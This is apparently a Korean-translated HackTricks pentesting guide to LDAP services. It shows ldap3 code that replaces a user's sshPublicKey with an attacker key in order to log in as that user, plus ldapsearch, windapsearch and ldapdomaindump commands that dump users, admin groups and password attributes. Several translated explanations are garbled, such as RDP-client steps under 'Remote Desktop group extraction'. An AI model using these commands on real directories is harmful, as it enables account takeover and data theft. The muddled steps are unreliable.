# 389, 636, 3268, 3269 - LDAPì˜ Pentesting

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**ë¥¼** **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks**ì™€ **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ **í•˜ì„¸ìš”.

</details>

**LDAP** (Lightweight Directory Access Protocol)ì˜ ì‚¬ìš©ì€ ì£¼ë¡œ ê³µê°œ ë° ë¹„ê³µê°œ ë„¤íŠ¸ì›Œí¬ ë‚´ì—ì„œ ì¡°ì§, ê°œì¸ ë° íŒŒì¼ ë° ì¥ì¹˜ì™€ ê°™ì€ ë¦¬ì†ŒìŠ¤ì™€ ê°™ì€ ë‹¤ì–‘í•œ ì—”í‹°í‹°ë¥¼ ì°¾ê¸° ìœ„í•œ ê²ƒì…ë‹ˆë‹¤. ì´ëŠ” ì´ì „ ë²„ì „ì¸ DAPì™€ ë¹„êµí•˜ì—¬ ì½”ë“œ í¬ê¸°ê°€ ì‘ì•„ì§„ ê²ƒìœ¼ë¡œ, ê°„ì†Œí™”ëœ ì ‘ê·¼ ë°©ì‹ì„ ì œê³µí•©ë‹ˆë‹¤.

LDAP ë””ë ‰í† ë¦¬ëŠ” ì—¬ëŸ¬ ì„œë²„ì— ë¶„ì‚°ë˜ì–´ ë°°ì¹˜ë˜ë„ë¡ êµ¬ì„±ë˜ì–´ ìˆìœ¼ë©°, ê° ì„œë²„ëŠ” ë””ë ‰í† ë¦¬ì˜ ë³µì œ ë° ë™ê¸°í™”ëœ ë²„ì „ì„ ê°€ì§€ê³  ìˆìœ¼ë©° Directory System Agent (DSA)ë¼ê³ ë„ í•©ë‹ˆë‹¤. ìš”ì²­ ì²˜ë¦¬ì˜ ì±…ì„ì€ ì™„ì „íˆ LDAP ì„œë²„ì— ìˆìœ¼ë©°, í•„ìš”ì— ë”°ë¼ ë‹¤ë¥¸ DSAì™€ í†µì‹ í•˜ì—¬ ìš”ì²­ìì—ê²Œ í†µí•©ëœ ì‘ë‹µì„ ì œê³µí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

LDAP ë””ë ‰í† ë¦¬ì˜ êµ¬ì„±ì€ **íŠ¸ë¦¬ ê³„ì¸µ êµ¬ì¡°**ë¡œ ì´ë£¨ì–´ì ¸ ìˆìœ¼ë©°, ë§¨ ìœ„ì—ëŠ” ë£¨íŠ¸ ë””ë ‰í† ë¦¬ê°€ ìˆìŠµë‹ˆë‹¤. ì´ëŠ” êµ­ê°€ë¡œ ë‚˜ë‰˜ì–´ì§€ê³ , ì´ì–´ì„œ ì¡°ì§ìœ¼ë¡œ ë‚˜ë‰˜ë©°, ë§ˆì§€ë§‰ìœ¼ë¡œ ë‹¤ì–‘í•œ ë¶€ì„œë¥¼ ë‚˜íƒ€ë‚´ëŠ” ì¡°ì§ ë‹¨ìœ„ë¡œ ë‚˜ë‰˜ì–´ì§€ë©°, ë§ˆì§€ë§‰ìœ¼ë¡œ ê°œì¸ê³¼ íŒŒì¼ ë° í”„ë¦°í„°ì™€ ê°™ì€ ê³µìœ  ë¦¬ì†ŒìŠ¤ë¥¼ í¬í•¨í•œ ê°œì²´ ìˆ˜ì¤€ì— ë„ë‹¬í•©ë‹ˆë‹¤.

**ê¸°ë³¸ í¬íŠ¸:** 389 ë° 636(ldaps). Global Catalog (ActiveDirectoryì˜ LDAP)ì€ ê¸°ë³¸ì ìœ¼ë¡œ 3268 í¬íŠ¸ì—ì„œ ì‚¬ìš© ê°€ëŠ¥í•˜ë©°, LDAPSì˜ ê²½ìš° 3269 í¬íŠ¸ì—ì„œ ì‚¬ìš© ê°€ëŠ¥í•©ë‹ˆë‹¤.
```
PORT    STATE SERVICE REASON
389/tcp open  ldap    syn-ack
636/tcp open  tcpwrapped
```
### LDAP ë°ì´í„° êµí™˜ í˜•ì‹

LDIF (LDAP ë°ì´í„° êµí™˜ í˜•ì‹)ì€ ë””ë ‰í„°ë¦¬ ë‚´ìš©ì„ ë ˆì½”ë“œì˜ ì§‘í•©ìœ¼ë¡œ ì •ì˜í•©ë‹ˆë‹¤. ë˜í•œ ì—…ë°ì´íŠ¸ ìš”ì²­ (ì¶”ê°€, ìˆ˜ì •, ì‚­ì œ, ì´ë¦„ ë³€ê²½)ì„ ë‚˜íƒ€ë‚¼ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.
```bash
dn: dc=local
dc: local
objectClass: dcObject

dn: dc=moneycorp,dc=local
dc: moneycorp
objectClass: dcObject
objectClass: organization

dn ou=it,dc=moneycorp,dc=local
objectClass: organizationalUnit
ou: dev

dn: ou=marketing,dc=moneycorp,dc=local
objectClass: organizationalUnit
Ou: sales

dn: cn= ,ou= ,dc=moneycorp,dc=local
objectClass: personalData
cn:
sn:
gn:
uid:
ou:
mail: pepe@hacktricks.xyz
phone: 23627387495
```
* 1-3ë²ˆ ì¤„ì€ ìµœìƒìœ„ ë„ë©”ì¸ localì„ ì •ì˜í•©ë‹ˆë‹¤.
* 5-8ë²ˆ ì¤„ì€ ì²« ë²ˆì§¸ ìˆ˜ì¤€ ë„ë©”ì¸ moneycorp (moneycorp.local)ì„ ì •ì˜í•©ë‹ˆë‹¤.
* 10-16ë²ˆ ì¤„ì€ 2ê°œì˜ ì¡°ì§ ë‹¨ìœ„(devì™€ sales)ë¥¼ ì •ì˜í•©ë‹ˆë‹¤.
* 18-26ë²ˆ ì¤„ì€ ë„ë©”ì¸ ê°ì²´ë¥¼ ìƒì„±í•˜ê³  ê°’ê³¼ ì†ì„±ì„ í• ë‹¹í•©ë‹ˆë‹¤.

## ë°ì´í„° ì‘ì„±

ê°’ì„ ìˆ˜ì •í•  ìˆ˜ ìˆë‹¤ë©´ ë§¤ìš° í¥ë¯¸ë¡œìš´ ì‘ì—…ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, ì‚¬ìš©ì ë˜ëŠ” ë‹¤ë¥¸ ì‚¬ìš©ìì˜ "sshPublicKey" ì •ë³´ë¥¼ ë³€ê²½í•  ìˆ˜ ìˆë‹¤ê³  ê°€ì •í•´ë³´ì„¸ìš”. ì´ ì†ì„±ì´ ì¡´ì¬í•œë‹¤ë©´, sshê°€ LDAPì—ì„œ ê³µê°œ í‚¤ë¥¼ ì½ê³  ìˆì„ í™•ë¥ ì´ ë§¤ìš° ë†’ìŠµë‹ˆë‹¤. ì‚¬ìš©ìì˜ ê³µê°œ í‚¤ë¥¼ ìˆ˜ì •í•  ìˆ˜ ìˆë‹¤ë©´, sshì—ì„œ ë¹„ë°€ë²ˆí˜¸ ì¸ì¦ì´ í™œì„±í™”ë˜ì§€ ì•Šì•„ë„ í•´ë‹¹ ì‚¬ìš©ìë¡œ ë¡œê·¸ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
# Example from https://www.n00py.io/2020/02/exploiting-ldap-server-null-bind/
>>> import ldap3
>>> server = ldap3.Server('x.x.x.x', port =636, use_ssl = True)
>>> connection = ldap3.Connection(server, 'uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN', 'PASSWORD', auto_bind=True)
>>> connection.bind()
True
>>> connection.extend.standard.who_am_i()
u'dn:uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN'
>>> connection.modify('uid=USER,ou=USERS,dc=DOMAINM=,dc=DOMAIN',{'sshPublicKey': [(ldap3.MODIFY_REPLACE, ['ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHRMu2et/B5bUyHkSANn2um9/qtmgUTEYmV9cyK1buvrS+K2gEKiZF5pQGjXrT71aNi5VxQS7f+s3uCPzwUzlI2rJWFncueM1AJYaC00senG61PoOjpqlz/EUYUfj6EUVkkfGB3AUL8z9zd2Nnv1kKDBsVz91o/P2GQGaBX9PwlSTiR8OGLHkp2Gqq468QiYZ5txrHf/l356r3dy/oNgZs7OWMTx2Rr5ARoeW5fwgleGPy6CqDN8qxIWntqiL1Oo4ulbts8OxIU9cVsqDsJzPMVPlRgDQesnpdt4cErnZ+Ut5ArMjYXR2igRHLK7atZH/qE717oXoiII3UIvFln2Ivvd8BRCvgpo+98PwN8wwxqV7AWo0hrE6dqRI7NC4yYRMvf7H8MuZQD5yPh2cZIEwhpk7NaHW0YAmR/WpRl4LbT+o884MpvFxIdkN1y1z+35haavzF/TnQ5N898RcKwll7mrvkbnGrknn+IT/v3US19fPJWzl1/pTqmAnkPThJW/k= badguy@evil'])]})
```
## í‰ë¬¸ìœ¼ë¡œ ëœ ìê²© ì¦ëª… ìŠ¤ë‹ˆí•‘

LDAPê°€ SSL ì—†ì´ ì‚¬ìš©ë˜ëŠ” ê²½ìš°, ë„¤íŠ¸ì›Œí¬ì—ì„œ **í‰ë¬¸ìœ¼ë¡œ ëœ ìê²© ì¦ëª…ì„ ìŠ¤ë‹ˆí•‘**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë˜í•œ, LDAP ì„œë²„ì™€ í´ë¼ì´ì–¸íŠ¸ ì‚¬ì´ì˜ ë„¤íŠ¸ì›Œí¬ì—ì„œ **MITM**(ì¤‘ê°„ì ê³µê²©)ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì—¬ê¸°ì„œëŠ” í´ë¼ì´ì–¸íŠ¸ê°€ **í‰ë¬¸ìœ¼ë¡œ ëœ ìê²© ì¦ëª…**ì„ ì‚¬ìš©í•˜ì—¬ ë¡œê·¸ì¸í•˜ë„ë¡ **ë‹¤ìš´ê·¸ë ˆì´ë“œ ê³µê²©**ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**SSLì´ ì‚¬ìš©ë˜ëŠ” ê²½ìš°**, ìœ„ì—ì„œ ì–¸ê¸‰í•œ ê²ƒê³¼ ê°™ì´ **MITM**ì„ ì‹œë„í•  ìˆ˜ ìˆì§€ë§Œ, **ê°€ì§œ ì¸ì¦ì„œ**ë¥¼ ì œê³µí•˜ì—¬ ì‚¬ìš©ìê°€ ì´ë¥¼ **ìˆ˜ë½í•˜ëŠ” ê²½ìš°** ì¸ì¦ ë°©ë²•ì„ ë‹¤ìš´ê·¸ë ˆì´ë“œí•˜ê³  ìê²© ì¦ëª…ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## ìµëª… ì•¡ì„¸ìŠ¤

### TLS SNI ê²€ì‚¬ ìš°íšŒ

[**ì´ ë¬¸ì„œ**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)ì— ë”°ë¥´ë©´ ì„ì˜ì˜ ë„ë©”ì¸ ì´ë¦„(ì˜ˆ: company.com)ìœ¼ë¡œ LDAP ì„œë²„ì— ì•¡ì„¸ìŠ¤í•˜ë©´ ìµëª… ì‚¬ìš©ìë¡œì„œ LDAP ì„œë¹„ìŠ¤ì— ì—°ë½í•˜ê³  ì •ë³´ë¥¼ ì¶”ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
ldapsearch -H ldaps://company.com:636/ -x -s base -b '' "(objectClass=*)" "*" +
```
### LDAP ìµëª… ë°”ì¸ë”©

[LDAP ìµëª… ë°”ì¸ë”©](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/anonymous-ldap-operations-active-directory-disabled)ì€ **ì¸ì¦ë˜ì§€ ì•Šì€ ê³µê²©ì**ê°€ ë„ë©”ì¸ì—ì„œ ì •ë³´ë¥¼ ê²€ìƒ‰í•  ìˆ˜ ìˆê²Œ í•´ì¤ë‹ˆë‹¤. ì´ ì •ë³´ì—ëŠ” ì‚¬ìš©ì, ê·¸ë£¹, ì»´í“¨í„°, ì‚¬ìš©ì ê³„ì • ì†ì„± ë° ë„ë©”ì¸ ì•”í˜¸ ì •ì±…ì˜ ì™„ì „í•œ ëª©ë¡ì´ í¬í•¨ë©ë‹ˆë‹¤. ì´ëŠ” **ë ˆê±°ì‹œ êµ¬ì„±**ì´ë©° Windows Server 2003ë¶€í„°ëŠ” ì¸ì¦ëœ ì‚¬ìš©ìë§Œ LDAP ìš”ì²­ì„ ì‹œì‘í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ê·¸ëŸ¬ë‚˜ ê´€ë¦¬ìëŠ” **ìµëª… ë°”ì¸ë”©ì„ í—ˆìš©í•˜ë„ë¡ íŠ¹ì • ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ì„¤ì •**í•´ì•¼ í•  ìˆ˜ ìˆìœ¼ë©°, ì˜ë„í•˜ì§€ ì•Šì€ ì–‘ì˜ ì•¡ì„¸ìŠ¤ë¥¼ ì œê³µí•˜ì—¬ ì¸ì¦ë˜ì§€ ì•Šì€ ì‚¬ìš©ìê°€ ADì˜ ëª¨ë“  ê°œì²´ì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆê²Œ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## ìœ íš¨í•œ ìê²© ì¦ëª…

LDAP ì„œë²„ì— ë¡œê·¸ì¸í•  ìœ íš¨í•œ ìê²© ì¦ëª…ì´ ìˆë‹¤ë©´, ë‹¤ìŒì„ ì‚¬ìš©í•˜ì—¬ ë„ë©”ì¸ ê´€ë¦¬ìì— ëŒ€í•œ ëª¨ë“  ì •ë³´ë¥¼ ë¤í”„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

[ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump)
```bash
pip3 install ldapdomaindump
ldapdomaindump <IP> [-r <IP>] -u '<domain>\<username>' -p '<password>' [--authtype SIMPLE] --no-json --no-grep [-o /path/dir]
```
### [ë¬´ì°¨ë³„ ëŒ€ì… ê³µê²©](../generic-methodologies-and-resources/brute-force.md#ldap)

## ì—´ê±°

### ìë™í™”ëœ ë°©ë²•

ì´ë¥¼ ì‚¬ìš©í•˜ë©´ **ê³µê°œ ì •ë³´** (ì˜ˆ: ë„ë©”ì¸ ì´ë¦„)ì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
nmap -n -sV --script "ldap* and not brute" <IP> #Using anonymous credentials
```
### íŒŒì´ì¬

<details>

<summary>íŒŒì´ì¬ì„ ì‚¬ìš©í•œ LDAP ì—´ê±°</summary>

íŒŒì´ì¬ì„ ì‚¬ìš©í•˜ì—¬ **ìê²© ì¦ëª…ì„ ì‚¬ìš©í•˜ê±°ë‚˜ ì‚¬ìš©í•˜ì§€ ì•Šê³ ** LDAPì„ ì—´ê±°í•´ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤: `pip3 install ldap3`

ë¨¼ì € **ìê²© ì¦ëª… ì—†ì´** ì—°ê²°ì„ ì‹œë„í•´ ë³´ì„¸ìš”:
```bash
>>> import ldap3
>>> server = ldap3.Server('x.X.x.X', get_info = ldap3.ALL, port =636, use_ssl = True)
>>> connection = ldap3.Connection(server)
>>> connection.bind()
True
>>> server.info
```
ë§Œì•½ ì´ì „ ì˜ˆì œì™€ ê°™ì´ ì‘ë‹µì´ `True`ì¸ ê²½ìš°, ë‹¤ìŒì—ì„œ LDAPì˜ ì¼ë¶€ **í¥ë¯¸ë¡œìš´ ë°ì´í„°**(ì˜ˆ: **ë„¤ì´ë° ì»¨í…ìŠ¤íŠ¸** ë˜ëŠ” **ë„ë©”ì¸ ì´ë¦„**) ì„œë²„ë¥¼ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
>>> server.info
DSA info (from DSE):
Supported LDAP versions: 3
Naming contexts:
dc=DOMAIN,dc=DOMAIN
```
í•œë²ˆ ë„¤ì´ë° ì»¨í…ìŠ¤íŠ¸ë¥¼ ì–»ìœ¼ë©´ ë” í¥ë¯¸ë¡œìš´ ì¿¼ë¦¬ë¥¼ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ê°„ë‹¨í•œ ì¿¼ë¦¬ëŠ” ë””ë ‰í„°ë¦¬ì— ìˆëŠ” ëª¨ë“  ê°ì²´ë¥¼ ë³´ì—¬ì¤ë‹ˆë‹¤:
```bash
>>> connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(objectClass=*))', search_scope='SUBTREE', attributes='*')
True
>> connection.entries
```
ì „ì²´ ldapì„ **ë¤í”„**í•˜ê±°ë‚˜:
```bash
>> connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(objectClass=person))', search_scope='SUBTREE', attributes='userPassword')
True
>>> connection.entries
```
</details>

### windapsearch

[**Windapsearch**](https://github.com/ropnop/windapsearch)ì€ LDAP ì¿¼ë¦¬ë¥¼ í™œìš©í•˜ì—¬ **Windows ë„ë©”ì¸ì—ì„œ ì‚¬ìš©ì, ê·¸ë£¹ ë° ì»´í“¨í„°ë¥¼ ì—´ê±°í•˜ëŠ” ë° ìœ ìš©í•œ** íŒŒì´ì¬ ìŠ¤í¬ë¦½íŠ¸ì…ë‹ˆë‹¤.
```bash
# Get computers
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --computers
# Get groups
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --groups
# Get users
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --da
# Get Domain Admins
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --da
# Get Privileged Users
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --privileged-users
```
### ldapsearch

ë„ ìê²© ì¦ëª… ë˜ëŠ” ìê²© ì¦ëª…ì´ ìœ íš¨í•œì§€ í™•ì¸í•˜ì„¸ìš”:
```bash
ldapsearch -x -H ldap://<IP> -D '' -w '' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
```

```bash
# CREDENTIALS NOT VALID RESPONSE
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A4C, comment: In order to perform this opera
tion a successful bind must be completed on the connection., data 0, v3839
```
ë§Œì•½ "_bind must be completed_"ë¼ëŠ” ë‚´ìš©ì„ ë°œê²¬í•œë‹¤ë©´, í•´ë‹¹ ìê²© ì¦ëª…ì´ ì˜ëª»ë˜ì—ˆìŒì„ ì˜ë¯¸í•©ë‹ˆë‹¤.

ë„ë©”ì¸ì—ì„œ **ëª¨ë“  ê²ƒì„ ì¶”ì¶œ**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
-x Simple Authentication
-H LDAP Server
-D My User
-w My password
-b Base site, all data from here will be given
```
**ì‚¬ìš©ì** ì¶”ì¶œí•˜ê¸°:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
#Example: ldapsearch -x -H ldap://<IP> -D 'MYDOM\john' -w 'johnpassw' -b "CN=Users,DC=mydom,DC=local"
```
**ì»´í“¨í„°** ì¶”ì¶œí•˜ê¸°:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Computers,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
**ë‚´ ì •ë³´** ì¶”ì¶œí•˜ê¸°:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=<MY NAME>,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
**ë„ë©”ì¸ ê´€ë¦¬ì** ì¶”ì¶œí•˜ê¸°:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
**ë„ë©”ì¸ ì‚¬ìš©ì** ì¶”ì¶œ:

```plaintext
1. LDAP ì„œë²„ì— ì—°ê²°í•©ë‹ˆë‹¤.
2. ì‚¬ìš©ì ì¸ì¦ ì •ë³´ë¥¼ ì œê³µí•˜ì—¬ ë¡œê·¸ì¸í•©ë‹ˆë‹¤.
3. LDAP ì„œë²„ì—ì„œ "Domain Users" ê·¸ë£¹ì„ ì°¾ìŠµë‹ˆë‹¤.
4. "Domain Users" ê·¸ë£¹ì˜ êµ¬ì„±ì›ì„ ì¶”ì¶œí•©ë‹ˆë‹¤.
5. ì¶”ì¶œëœ ì‚¬ìš©ì ì •ë³´ë¥¼ ë¶„ì„í•˜ê³  í•„ìš”í•œ ì •ë³´ë¥¼ ìˆ˜ì§‘í•©ë‹ˆë‹¤.
```

**Note**: ì´ ê¸°ìˆ ì€ LDAP ì„œë²„ì—ì„œ "Domain Users" ê·¸ë£¹ì˜ êµ¬ì„±ì›ì„ ì¶”ì¶œí•˜ëŠ” ë°©ë²•ì„ ì„¤ëª…í•©ë‹ˆë‹¤.
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Users,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
**Enterprise Admins** ì¶”ì¶œ:

LDAPì—ì„œ **Enterprise Admins** ê·¸ë£¹ì„ ì¶”ì¶œí•˜ëŠ” ë°©ë²•ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

1. LDAP ì„œë²„ì— ì—°ê²°í•©ë‹ˆë‹¤.
2. **Domain Admins** ê·¸ë£¹ì˜ DN(Distinguished Name)ì„ ì°¾ìŠµë‹ˆë‹¤.
3. **Domain Admins** ê·¸ë£¹ì˜ DNì„ ì‚¬ìš©í•˜ì—¬ **Enterprise Admins** ê·¸ë£¹ì„ ê²€ìƒ‰í•©ë‹ˆë‹¤.
4. **Enterprise Admins** ê·¸ë£¹ì˜ DNì„ ì‚¬ìš©í•˜ì—¬ í•´ë‹¹ ê·¸ë£¹ì˜ êµ¬ì„±ì›ì„ ì¶”ì¶œí•©ë‹ˆë‹¤.

ë‹¤ìŒì€ Pythonì„ ì‚¬ìš©í•˜ì—¬ LDAP ì„œë²„ì—ì„œ **Enterprise Admins** ê·¸ë£¹ì„ ì¶”ì¶œí•˜ëŠ” ì˜ˆì‹œ ì½”ë“œì…ë‹ˆë‹¤:

```python
import ldap

# LDAP ì„œë²„ì— ì—°ê²°
conn = ldap.initialize('ldap://ldap_server_ip')

# ë°”ì¸ë“œ
conn.simple_bind_s('username', 'password')

# Domain Admins ê·¸ë£¹ì˜ DN ì°¾ê¸°
result = conn.search_s('dc=example,dc=com', ldap.SCOPE_SUBTREE, '(cn=Domain Admins)')
domain_admins_dn = result[0][0]

# Enterprise Admins ê·¸ë£¹ì˜ DN ì°¾ê¸°
result = conn.search_s('dc=example,dc=com', ldap.SCOPE_SUBTREE, '(cn=Enterprise Admins)')
enterprise_admins_dn = result[0][0]

# Enterprise Admins ê·¸ë£¹ì˜ êµ¬ì„±ì› ì¶”ì¶œ
result = conn.search_s(enterprise_admins_dn, ldap.SCOPE_BASE)
members = result[0][1]['member']

# êµ¬ì„±ì› ì¶œë ¥
for member in members:
    print(member)

# ì—°ê²° ì¢…ë£Œ
conn.unbind_s()
```

ìœ„ì˜ ì½”ë“œì—ì„œ `'ldap_server_ip'`, `'username'`, `'password'`, `'dc=example,dc=com'` ë“±ì€ ì‹¤ì œ í™˜ê²½ì— ë§ê²Œ ìˆ˜ì •í•´ì•¼ í•©ë‹ˆë‹¤.
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Enterprise Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
**Administrators** ì¶”ì¶œ:

```plaintext
1. ê´€ë¦¬ì ê·¸ë£¹ì˜ êµ¬ì„±ì›ì„ í™•ì¸í•˜ê¸° ìœ„í•´ LDAP ì„œë²„ì— ì—°ê²°í•©ë‹ˆë‹¤.
2. LDAP ì„œë²„ì— ëŒ€í•œ ìµëª… ë°”ì¸ë”©ì„ ì‹œë„í•©ë‹ˆë‹¤.
3. ìµëª… ë°”ì¸ë”©ì´ í—ˆìš©ë˜ì§€ ì•ŠëŠ” ê²½ìš°, ìœ íš¨í•œ ì‚¬ìš©ì ìê²© ì¦ëª…ì„ ì‚¬ìš©í•˜ì—¬ ë°”ì¸ë”©ì„ ì‹œë„í•©ë‹ˆë‹¤.
4. ë°”ì¸ë”©ì´ ì„±ê³µí•˜ë©´, ê´€ë¦¬ì ê·¸ë£¹ì˜ DN(Distinguished Name)ì„ ì°¾ìŠµë‹ˆë‹¤.
5. DNì„ ì‚¬ìš©í•˜ì—¬ ê´€ë¦¬ì ê·¸ë£¹ì˜ êµ¬ì„±ì›ì„ ê²€ìƒ‰í•©ë‹ˆë‹¤.
6. ê´€ë¦¬ì ê·¸ë£¹ì˜ êµ¬ì„±ì›ì„ ì¶”ì¶œí•©ë‹ˆë‹¤.
```

**Note**: ì´ ê¸°ìˆ ì€ LDAP ì„œë²„ì—ì„œ ê´€ë¦¬ì ê·¸ë£¹ì˜ êµ¬ì„±ì›ì„ ì¶”ì¶œí•˜ëŠ” ë°©ë²•ì„ ì„¤ëª…í•©ë‹ˆë‹¤. ì´ë¥¼ í†µí•´ ì‹œìŠ¤í…œì— ëŒ€í•œ ê¶Œí•œ ìƒìŠ¹ ê°€ëŠ¥ì„±ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Administrators,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
**ì›ê²© ë°ìŠ¤í¬í†± ê·¸ë£¹** ì¶”ì¶œ:

```plaintext
ì›ê²© ë°ìŠ¤í¬í†± ê·¸ë£¹ì€ ì›ê²©ìœ¼ë¡œ ì»´í“¨í„°ì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆëŠ” ì‚¬ìš©ì ê·¸ë£¹ì…ë‹ˆë‹¤. ì´ ê·¸ë£¹ì— ì†í•œ ì‚¬ìš©ìëŠ” ì›ê²©ìœ¼ë¡œ ì»´í“¨í„°ì— ë¡œê·¸ì¸í•˜ê³  ì‘ì—…í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì›ê²© ë°ìŠ¤í¬í†± ê·¸ë£¹ì—ëŠ” ì¼ë°˜ ì‚¬ìš©ìì™€ ê´€ë¦¬ì ê¶Œí•œì„ ê°€ì§„ ì‚¬ìš©ìê°€ í¬í•¨ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ê·¸ë£¹ì— ì†í•œ ì‚¬ìš©ìëŠ” ì›ê²©ìœ¼ë¡œ ì»´í“¨í„°ì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆëŠ” ê¶Œí•œì„ ê°€ì§€ê²Œ ë©ë‹ˆë‹¤.

ì›ê²© ë°ìŠ¤í¬í†± ê·¸ë£¹ì„ ì¶”ì¶œí•˜ëŠ” ë°©ë²•ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

1. ì›ê²© ë°ìŠ¤í¬í†± í´ë¼ì´ì–¸íŠ¸ë¥¼ ì‹¤í–‰í•©ë‹ˆë‹¤.
2. ì›ê²© ë°ìŠ¤í¬í†± í´ë¼ì´ì–¸íŠ¸ì—ì„œ "ì»´í“¨í„°" ë˜ëŠ” "ì„œë²„"ì— ëŒ€í•œ IP ì£¼ì†Œ ë˜ëŠ” í˜¸ìŠ¤íŠ¸ ì´ë¦„ì„ ì…ë ¥í•©ë‹ˆë‹¤.
3. "ì—°ê²°" ë²„íŠ¼ì„ í´ë¦­í•©ë‹ˆë‹¤.
4. ë¡œê·¸ì¸ ì°½ì´ í‘œì‹œë˜ë©´ ì›ê²© ë°ìŠ¤í¬í†± ê·¸ë£¹ì— ì†í•œ ì‚¬ìš©ì ì´ë¦„ê³¼ ì•”í˜¸ë¥¼ ì…ë ¥í•©ë‹ˆë‹¤.
